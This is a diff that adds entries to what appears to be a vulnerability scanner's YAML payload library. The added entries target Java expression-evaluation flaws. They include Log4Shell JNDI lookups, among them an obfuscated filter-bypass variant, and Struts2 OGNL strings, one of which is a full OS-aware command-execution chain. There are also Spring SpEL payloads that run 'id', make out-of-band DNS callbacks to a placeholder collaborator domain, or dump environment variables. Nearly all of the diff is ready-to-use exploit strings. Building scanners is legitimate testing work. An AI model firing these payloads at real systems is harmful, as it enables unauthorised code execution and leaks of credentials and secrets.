@@ -466,3 +466,126 @@ payloads:
     placeholders: [COLLAB_DOMAIN]
     notes: "Jinja2 — OOB DNS confirmation of RCE."
     tags: [jinja2, python, oob, dns]
+
+  # ============================================================
+  # Log4Shell (JNDI) — CVE-2021-44228
+  # ============================================================
+  - technique: expression_eval
+    injection_surface: header
+    evidence_type: dns_hit
+    risk: 4
+    runtime: jvm
+    payload: "${jndi:ldap://COLLAB_DOMAIN/a}"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Log4Shell — JNDI lookup via LDAP. Triggers DNS callback if Log4j 2.x < 2.17 processes the string."
+    tags: [log4shell, jndi, ldap, cve_2021_44228]
+
+  - technique: expression_eval
+    injection_surface: header
+    evidence_type: dns_hit
+    risk: 4
+    runtime: jvm
+    payload: "${jndi:dns://COLLAB_DOMAIN/a}"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Log4Shell — JNDI lookup via DNS protocol. Alternative to LDAP that works through more firewalls."
+    tags: [log4shell, jndi, dns, cve_2021_44228]
+
+  - technique: expression_eval
+    injection_surface: header
+    evidence_type: dns_hit
+    risk: 4
+    runtime: jvm
+    payload: "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://COLLAB_DOMAIN/a}"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Log4Shell — obfuscated JNDI via nested lookups. Bypasses naive string filters."
+    tags: [log4shell, jndi, obfuscated, bypass]
+
+  - technique: expression_eval
+    injection_surface: query
+    evidence_type: dns_hit
+    risk: 4
+    runtime: jvm
+    payload: "${jndi:ldap://COLLAB_DOMAIN/a}"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Log4Shell via query parameter. Any logged parameter may trigger lookup."
+    tags: [log4shell, jndi, query]
+
+  # ============================================================
+  # Struts2 OGNL — CVE-2017-5638 style
+  # ============================================================
+  - technique: expression_eval
+    injection_surface: header
+    evidence_type: content_match
+    risk: 4
+    runtime: jvm
+    payload: "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','Ensphere')}"
+    notes: "Struts2 OGNL injection via Content-Type header. Attempts to add custom response header."
+    tags: [struts2, ognl, cve_2017_5638]
+
+  - technique: expression_eval
+    injection_surface: header
+    evidence_type: content_match
+    risk: 4
+    runtime: jvm
+    payload: "${#rt = @java.lang.Runtime@getRuntime(),#rt.exec('id')}"
+    notes: "Struts2 OGNL RCE via static method access. Targets ActionProxy evaluation."
+    tags: [struts2, ognl, rce]
+
+  - technique: expression_eval
+    injection_surface: header
+    evidence_type: dns_hit
+    risk: 4
+    runtime: jvm
+    payload: "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='nslookup COLLAB_DOMAIN').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())}"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Struts2 OGNL — full RCE chain with OS detection. CVE-2017-5638 pattern."
+    tags: [struts2, ognl, rce, oob]
+
+  # ============================================================
+  # Spring Expression Language (SpEL)
+  # ============================================================
+  - technique: expression_eval
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    runtime: jvm
+    payload: "${T(java.lang.Runtime).getRuntime().exec('id')}"
+    notes: "Spring SpEL — RCE via type expression. Works where user input enters SpEL evaluation context."
+    tags: [spel, spring, rce]
+
+  - technique: expression_eval
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    runtime: jvm
+    payload: "#{T(java.lang.Runtime).getRuntime().exec('id')}"
+    notes: "Spring SpEL — alternate hash-prefix syntax for expression evaluation."
+    tags: [spel, spring, rce, hash_prefix]
+
+  - technique: expression_eval
+    injection_surface: header
+    evidence_type: dns_hit
+    risk: 4
+    runtime: jvm
+    payload: "${T(java.lang.Runtime).getRuntime().exec('nslookup COLLAB_DOMAIN')}"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Spring SpEL — OOB DNS confirmation of RCE."
+    tags: [spel, spring, rce, oob]
+
+  - technique: expression_eval
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: jvm
+    payload: "#{7*7}"
+    notes: "Spring SpEL — arithmetic evaluation probe. Returns 49 if SpEL processes input."
+    tags: [spel, spring, probe]
+
+  - technique: expression_eval
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    runtime: jvm
+    payload: "${T(java.lang.System).getenv()}"
+    notes: "Spring SpEL — dump all environment variables. Leaks secrets and config."
+    tags: [spel, spring, env_dump]
